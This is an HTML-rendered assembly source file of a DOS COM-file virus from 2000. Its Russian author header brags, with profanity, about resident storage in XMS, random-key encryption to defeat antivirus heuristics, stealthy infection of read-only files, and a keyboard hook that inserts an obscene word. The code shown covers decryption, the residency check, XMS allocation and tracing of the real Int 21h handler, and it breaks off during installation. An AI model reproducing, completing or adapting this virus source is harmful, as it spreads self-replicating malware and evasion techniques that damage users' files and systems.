<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>xmsvirus.asm</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">; COMMENT %</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;    COM.XMS-TSR.RDA-CRYPT. The basic part of virus is placed</span><span class="sc0">
</span><span class="sc1">;    into XMS, but there is a little loader into DOS memory. If it's</span><span class="sc0">
</span><span class="sc1">;    necessary, loader places XMS part of virus into the DOS memory,</span><span class="sc0">
</span><span class="sc1">;    executes it and then frees allocated DOS memory.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;    Ну че, не ждали, наверное? Но не надейтесь - от меня так просто не избави-</span><span class="sc0">
</span><span class="sc1">; тесь. Итак, вышел мой очередной продукт под DOS, и, как всегда, с извратами.</span><span class="sc0">
</span><span class="sc1">; Сразу хочу сказать, что я его написал за сегодняшинй день просто от нехуй де-</span><span class="sc0">
</span><span class="sc1">; лать. А что вы хотели? Я все пишу от нехуй делать. Вот вы сами то для чего пи-</span><span class="sc0">
</span><span class="sc1">; шите (если пишите вообще)? Ну да ладно, не об этом сейчас речь. Речь сейчас</span><span class="sc0">
</span><span class="sc1">; пойдет о возможностях данного продукта.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;    1. Вирус хранит свою резидентную копию не где-нибудь, а в XMS. "Но как же</span><span class="sc0">
</span><span class="sc1">;       он тогда может работать, раз в реальном режиме управление туда передать</span><span class="sc0">
</span><span class="sc1">;       нельзя?" - возразите вы и будете правы. Хитрость в том, что вирус остав-</span><span class="sc0">
</span><span class="sc1">;       ляет в обычной память небольшой подгрузчик и устанавливает на него вектор</span><span class="sc0">
</span><span class="sc1">;       Int 21h. Этот подгрузчик при необходимости выделяет в обычной памяти про-</span><span class="sc0">
</span><span class="sc1">;       странство, копирует туда свой код из XMS, передает ему управление, а за-</span><span class="sc0">
</span><span class="sc1">;       тем освобождает память. О том, как работает все это дело, нетрудно разо-</span><span class="sc0">
</span><span class="sc1">;       браться, посмотрев исходник. Для справки: доступ к XMS осуществляется че-</span><span class="sc0">
</span><span class="sc1">;       рез драйвер HIMEM.SYS, который, естественно, должен быть установлен. Ви-</span><span class="sc0">
</span><span class="sc1">;       рус корректно работает под Windows (там доступ к XMS всегда открыт).</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;    2. Вирус зашифрован с применением упрощенного RDA (Radnom Decoding</span><span class="sc0">
</span><span class="sc1">;       Algoritm). Для тех, кто в танке: RDA - это алгоритм шифровки, при кото-</span><span class="sc0">
</span><span class="sc1">;       ром ключ НЕ сохраняется. "Ну и как же ты тогда собираешься производить</span><span class="sc0">
</span><span class="sc1">;       расшифровку?" - слышаться насмешливые вопли ламеров. А очень просто: кое-</span><span class="sc0">
</span><span class="sc1">;       какая информация об исходном коде все-таки остается - его контрольная</span><span class="sc0">
</span><span class="sc1">;       сумма. Для того, чтобы расшифровать код, надо брать все ключи подряд (в</span><span class="sc0">
</span><span class="sc1">;       этом вирусе они берутся из порта таймера) и расшифровывать до тех пор,</span><span class="sc0">
</span><span class="sc1">;       пока контрольная сумма не совпадет. Реально на это уходит совсем немного</span><span class="sc0">
</span><span class="sc1">;       времени, зато антивирусы с их эвристиками затыкаются. Однако знающий че-</span><span class="sc0">
</span><span class="sc1">;       ловек может спросить: "А не может ли получится так, что контрольная сумма</span><span class="sc0">
</span><span class="sc1">;       совпадет, но код при этом будет расшифрован неправильно?" Теоретически -</span><span class="sc0">
</span><span class="sc1">;       вполне может, но вероятность этого очень мала. Кстати, если вздумаете</span><span class="sc0">
</span><span class="sc1">;       что-то менять в вирусе, не забудьте подкорректировать контрольную сумму.</span><span class="sc0">
</span><span class="sc1">;       Как это сделать? Знающий человек разберется. Но если ты - мелкий ламер,</span><span class="sc0">
</span><span class="sc1">;       который просто хочет поменять мой копирайт, то пиздуй отсюда на хуй.</span><span class="sc0">
</span><span class="sc1">;       </span><span class="sc0">
</span><span class="sc1">;    3. Вирус стандартно заражает COM файлы, дописываясь в конец. Длина заражен-</span><span class="sc0">
</span><span class="sc1">;       ных файлов увеличивается на 777 байт. Обрабатывает файлы с атрибутом</span><span class="sc0">
</span><span class="sc1">;       "Read Only". Не изменяет время создания и атрибуты файла. Не глючит на</span><span class="sc0">
</span><span class="sc1">;       защищенных от записи дискетах. Корректно заражает COM файлы для Windows -</span><span class="sc0">
</span><span class="sc1">;       ENUNS, RUSNS и т.п. - но вместо этих сигнатур записывает "БЛЯNS" (кстати,</span><span class="sc0">
</span><span class="sc1">;       это также используется для проверки зараженности файла). </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;    4. Вирус определяет адрес настоящего обработчика Int 21h с помощью PSP. В</span><span class="sc0">
</span><span class="sc1">;       PSP:[6] находится дальный адрес, который указывает куда-то в DOS, но это</span><span class="sc0">
</span><span class="sc1">;       не то, что нам нужно. Обычно там лежат несколько дальних JMP-ов, и мы</span><span class="sc0">
</span><span class="sc1">;       проходим по их цепочке, а затем ищем обработчик Int 21h по сигнатуре. В</span><span class="sc0">
</span><span class="sc1">;       случае неудачи берем адрес из таблицы векторов.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;    5. Вирус перехватывает также прерывание клавиатуры и с вероятностью 1/9</span><span class="sc0">
</span><span class="sc1">;       вставляет после запятой слово "бля".</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;                                   DJ Sadovnikov (http://i.am/djsad), 11.07.2000</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  ══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;           Компилировать с помощью TASM 4.1+</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;              tasm /m xmsvirus.asm</span><span class="sc0">
</span><span class="sc1">;              tlink /t /x xmsvirus.obj</span><span class="sc0">
</span><span class="sc1">;              del xmsvirus.com</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;           Файлы из архива:</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;              xmsvirus.asm  14600 (исходник вируса)</span><span class="sc0">
</span><span class="sc1">;              xmsvirus.com    800 (бинарник вируса)</span><span class="sc0">
</span><span class="sc1">; %</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">


</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">

        </span><span class="sc2">.286</span><span class="sc0">
</span><span class="sc5">Code</span><span class="sc0">        </span><span class="sc9">segment</span><span class="sc0">
        </span><span class="sc9">assume</span><span class="sc0">  </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">Code</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">Code</span><span class="sc0">
        </span><span class="sc9">org</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0">


</span><span class="sc5">Start</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0E9h</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc5">Virus</span><span class="sc4">-</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">9</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Msg</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0"> 

</span><span class="sc5">Msg</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'Virus is OK$'</span><span class="sc0">

</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">










</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">
</span><span class="sc1">;                            НАЧАЛО ВИРУСА</span><span class="sc0">
</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">

</span><span class="sc5">msr</span><span class="sc0">     </span><span class="sc9">macro</span><span class="sc0">   </span><span class="sc5">reg1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">reg2</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">reg2</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc5">reg1</span><span class="sc0">
        </span><span class="sc9">endm</span><span class="sc0">


</span><span class="sc5">Virus</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">pusha</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetIP</span><span class="sc0">
</span><span class="sc5">GetIP</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">GetIP</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc0">


        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Crypted</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc4">+</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">L0</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">EndCrypt</span><span class="sc4">-</span><span class="sc5">Crypted</span><span class="sc0">
        </span><span class="sc6">in</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">


</span><span class="sc1">;[Расшифровываем вирус случайным ключем]</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc5">L1</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">L1</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">


</span><span class="sc1">;[Считаем контрольную сумму]</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc5">L2</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">adc</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">L2</span><span class="sc0">


</span><span class="sc1">;[Если CRC не совпала, пробуем другой ключ]</span><span class="sc0">

</span><span class="sc5">CRC</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">121Eh</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">L0</span><span class="sc0">

</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">

</span><span class="sc1">;[Восстанавливаем первые три байта зараженной программы]</span><span class="sc0">

</span><span class="sc5">Crypted</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Old3b</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc4">+</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">100h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Old3b</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc4">+</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">102h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">


</span><span class="sc1">;[Проверяем наличие вируса в памяти]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ABCDh</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0CDABh</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Install</span><span class="sc0">


</span><span class="sc1">;[Отдаем управление зараженной программе]</span><span class="sc0">

</span><span class="sc5">Exit</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">100h</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">;[Проверяем наличие драйвера XMS]</span><span class="sc0">

</span><span class="sc5">Install</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4300h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">2Fh</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Exit</span><span class="sc0">


</span><span class="sc1">;[Получаем адрес менеджера XMS]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4310h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">2Fh</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">DrXMS</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc4">+</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">DrXMS</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc4">+</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">


</span><span class="sc1">;[Выделяем блок в XMS]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">09h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">CodeMem</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">DrXMS</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc4">+</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">Exit</span><span class="sc0">


</span><span class="sc1">;[Настраиваем поля структур пересылки]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">DOStoXMS</span><span class="sc4">+</span><span class="sc2">06h</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc4">+</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">DOStoXMS</span><span class="sc4">+</span><span class="sc2">08h</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc4">+</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">DOStoXMS</span><span class="sc4">+</span><span class="sc2">0Ah</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc4">+</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">XMStoDOS</span><span class="sc4">+</span><span class="sc2">04h</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc4">+</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">


</span><span class="sc1">;[Копируем вирус в XMS]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Bh</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">DOStoXMS</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc4">+</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">DrXMS</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc4">+</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">Exit</span><span class="sc0">


</span><span class="sc1">;[Получаем размер текущего блока памяти]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">LoaderMem</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0">


</span><span class="sc1">;[Укорачиваем текущий блок памяти]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4Ah</span><span class="sc0">
        </span><span class="sc5">msr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">Exit</span><span class="sc0">


</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">
</span><span class="sc1">;            Нахождение адреса настоящего обработчика Int 21h</span><span class="sc0">
</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">

</span><span class="sc1">;[Ищем точку входа в обработчик Int 21h]</span><span class="sc0">

        </span><span class="sc6">lds</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">Trace</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">0EAh</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Check1</span><span class="sc0">
        </span><span class="sc6">lds</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Trace</span><span class="sc0">


</span><span class="sc1">;[Первый возможный вариант обработчика Int 21h]</span><span class="sc0">

</span><span class="sc5">Check1</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">9090h</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Check2</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">32h</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">9090h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">Found</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">NotFound</span><span class="sc0">


</span><span class="sc1">;[Второй возможный вариант обработчика Int 21h]</span><span class="sc0">

</span><span class="sc5">Check2</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">2E1Eh</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">NotFound</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">25h</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">80FAh</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">Found</span><span class="sc0">


</span><span class="sc1">;[В случае неудачи берем адрес из таблицы векторов]</span><span class="sc0">

</span><span class="sc5">NotFound</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3521h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc5">msr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">


</span><span class="sc1">;[Сохраняем адрес в Int 65h]</span><span class="sc0">

</span><span class="sc5">Found</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2565h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">

</span><span class="sc1">;[Сохраняем адрес старого обработчика Int 21h]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3521h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc5">msr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Ofs21h</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc4">+</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Seg21h</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc4">+</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">


</span><span class="sc1">;[Сохраняем адрес старого обработчика Int 09h]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3509h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Ofs09h</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc4">+</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Seg09h</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc4">+</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">


</span><span class="sc1">;[Выделяем память для Loader]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">48h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">LoaderMem</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
